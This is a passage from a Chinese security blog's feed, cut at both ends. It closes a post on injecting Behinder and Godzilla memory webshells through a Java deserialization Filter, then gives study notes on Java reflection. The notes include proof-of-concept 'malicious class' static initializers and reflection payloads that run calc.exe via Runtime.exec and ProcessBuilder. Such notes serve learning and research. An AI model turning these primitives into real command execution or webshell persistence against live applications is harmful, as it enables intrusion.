&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>测试效果&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220602221346197.png" alt="image-20220602221346197">&lt;/p>
&lt;p>成功达到预期效果&lt;/p>
&lt;h3 id="注意">注意&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>我们通过反序列化接入的冰蝎和哥斯拉是作为添加的Filter的一部分，所以一旦Filter被kill了，冰蝎和哥斯拉也将会连不上&lt;/p>
&lt;/li>
&lt;li>
&lt;p>x&lt;/p>
&lt;/li>
&lt;/ol>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://threedr3am.github.io/2020/06/12/%E9%83%BD0202%E5%B9%B4%E4%BA%86%E8%80%81%E5%97%A8%E8%BF%98%E5%9C%A8%E7%94%A8%E7%9A%84%20-%20%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BFjsp%20webshell/">都0202年了老嗨还在用的 - 各种姿势jsp webshell&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xz.aliyun.com/t/11003">JAVA内存马的“一生”&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.anquanke.com/post/id/224698">Tomcat容器攻防笔记之JSP金蝉脱壳&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://y4er.com/post/java-deserialization-inject-behinder-memshell-note/">Java反序列化注入冰蝎内存马相关踩坑笔记&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">解决哥斯拉内存马pagecontext的问题&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Java学习笔记Ⅳ</title><link>https://amiaaaz.github.io/2022/05/04/java-study-notes-04/</link><pubDate>Wed, 04 May 2022 16:03:58 +0800</pubDate><guid>https://amiaaaz.github.io/2022/05/04/java-study-notes-04/</guid><description>&lt;p>p牛安全漫谈学习&lt;/p>
&lt;h2 id="反射">反射&lt;/h2>
&lt;p>关于动态特性，p牛给出了这样的定义&lt;/p>
&lt;blockquote>
&lt;p>一段代码，改变其中的变量，将会导致这段代码产生功能性的变化&lt;/p>
&lt;/blockquote>
&lt;p>PHP的一句话🐎也正是这个特性的体现之一，java虽然没有PHP这么灵活，但是强大的反射功能也可以提供一些动态特性，比如这样的函数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">execute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">className&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">methodName&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// 执行
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>最终执行的方法根据传入的参数而定&lt;/p>
&lt;h3 id="forname">forName&lt;/h3>
&lt;p>获取一个&lt;code>class&lt;/code>的&lt;code>Class&lt;/code>实例的方式之一是&lt;code>Class.forName&lt;/code>，它有两个函数重载&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#75715e">// 常用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">**&lt;/span>&lt;span style="color:#00a8c8">boolean&lt;/span>&lt;span style="color:#f92672">**&lt;/span> &lt;span style="color:#111">initialize&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassLoader&lt;/span> &lt;span style="color:#111">loader&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第一个参数是类名，完整路径（如果可控就可以加载任意类），如果加载内部类可以用&lt;code>Class.forName(&amp;quot;C1$C2&amp;quot;)&lt;/code>&lt;/p>
&lt;p>第三个参数&lt;code>ClassLoader&lt;/code>的作用是告诉JVM如何加载这个类，java默认的&lt;code>ClassLoader&lt;/code>就是根据类名（类完整路径）来加载类&lt;/p>
&lt;p>对于第二个参数，即使我们设置&lt;code>true&lt;/code>，也不会在执行&lt;code>forName&lt;/code>时执行构造函数，因为这里的&lt;code>initialize&lt;/code>指的是类的初始化，调用其中的&lt;code>static&lt;/code>部分代码&lt;/p>
&lt;ul>
&lt;li>
&lt;p>类的实例化(newInstance)：static{} -&amp;gt; {} -&amp;gt; 构造函数&lt;/p>
&lt;/li>
&lt;li>
&lt;p>类的初始化(initial)：static{}&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>由此，如果&lt;code>forName&lt;/code>的参数可控，我们可以编写恶意类（恶意代码位于static中），进而完成对指定类的初始化 触发static{}部分；编写poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">victim&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ref.exp&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">ref&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">exp&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Runtime&lt;/span> &lt;span style="color:#111">rt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Process&lt;/span> &lt;span style="color:#111">ps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">rt&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">exec&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">waitFor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;error here&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="getmethodinvoke">getMethod&amp;amp;invoke&lt;/h3>
&lt;p>&lt;code>Class.newInstance&lt;/code>调用的是该类的public无参构造函数，而有参数的构造方法 或非&lt;code>public&lt;/code>的构造方法都无法通过&lt;code>Class.newInstance()&lt;/code>调用，比如&lt;code>Runtime&lt;/code>的构造方法就是私有的（单例模式），下面的栗子就无法执行&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>鉴于此，我们可以通过&lt;code>Runtime.getRuntime&lt;/code>获取到&lt;code>Runtime&lt;/code>对象，这里指定的重载为最简单的&lt;code>exec&lt;/code>，依旧是通过invoke调用：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>invoke&lt;/code>作用是执行方法，如果这个方法是普通方法，那么第一个参数是类对象；如果是静态方法，那么第一个参数是类，上面的payload相当于&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">execMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">getRuntimeMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">runtime&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getRuntimeMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">execMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">runtime&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>另一个API是&lt;code>getDeclaredMethod&lt;/code>，获取当前类声明的所有方法（不包括从父类继承来的方法 包含当前类的私有方法），结合这一点，我们也可以通过这个api获取到&lt;code>Runtime&lt;/code>对象并调用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意必须同时设置&lt;code>setAccessible(true)&lt;/code>修改作用域&lt;/p>
&lt;h3 id="getconstructor">getConstructor&lt;/h3>
&lt;p>当一个类没有public的无参构造方法时，我们可以首先用&lt;code>getConstructor&lt;/code>获取到构造函数（需要传入参数类型 因为可以有多种构造函数），之后用&lt;code>newInstance&lt;/code>实例化对象，再经过强制类型转换后用&lt;code>start&lt;/code>执行；这里用ProcessBuilder作示例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">ProcessBuilder&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">))).&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果目标环境没有强制类型转换时，我们可以再次借助反射&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;start&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">asList&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先获取到&lt;code>start&lt;/code>方法，然后&lt;code>invoke&lt;/code>执行，invoke 的第一个参数就是ProcessBuilder Object，逻辑也是很顺的：先获取要执行的方法，然后传入执行的参数&lt;/p>
&lt;p>如果要使用ProcessBuilder的另一个重载（参数为可变长参数String&amp;hellip; command 相当于数组），可以这样&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;java.lang.ProcessBuilder&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
